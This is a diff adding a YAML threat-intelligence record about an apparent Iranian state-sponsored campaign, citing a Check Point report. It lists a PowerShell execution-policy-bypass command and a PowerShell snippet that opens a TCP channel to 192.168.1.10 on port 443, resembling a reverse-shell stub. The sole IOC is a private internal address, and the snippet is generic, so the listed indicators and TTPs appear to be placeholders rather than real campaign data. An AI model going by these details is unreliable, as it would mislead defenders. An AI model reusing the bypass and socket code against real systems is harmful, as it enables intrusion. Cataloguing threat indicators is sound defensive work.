@@ -1,0 +1,34 @@
+summary: Irans state-sponsored hackers have demonstrated advanced tools and tactics
+  in a recent campaign, marking a significant shift in their capabilities.
+date: '2023-12-07'
+authors: CheckPoint
+attribution: Iran
+malware_families: []
+TTPs:
+  processs:
+  - powershell.exe
+  commandline:
+  - '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -ExecutionPolicy
+    Bypass -File "C:\\Users\\Public\\Documents\\invoice.ps1"'
+  powershell:
+  - "$client = New-Object System.Net.Sockets.TCPClient(\"192.168.1.10\", 443)\n$stream\
+    \ = $client.GetStream()\n[byte[]]$data = 0..65535|%{0}\n$i = 0\nwhile (($i = $stream.Read($data,\
+    \ 0, $data.Length)) -ne 0) {\n  # Process data here\n}\n$client.Close()\n"
+  registry_keys: []
+  network_connections:
+  - process: powershell.exe
+    port: '443'
+    destination:
+    - 192.168.1.10
+  file_modifications: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  ips:
+  - 192.168.1.10
+  domains: []
+  urls: []
+  hashes: []
+reference: https://research.checkpoint.com/2023/irans-most-advanced-cyber-attack-yet/
+file_creation_date: May 09, 2025
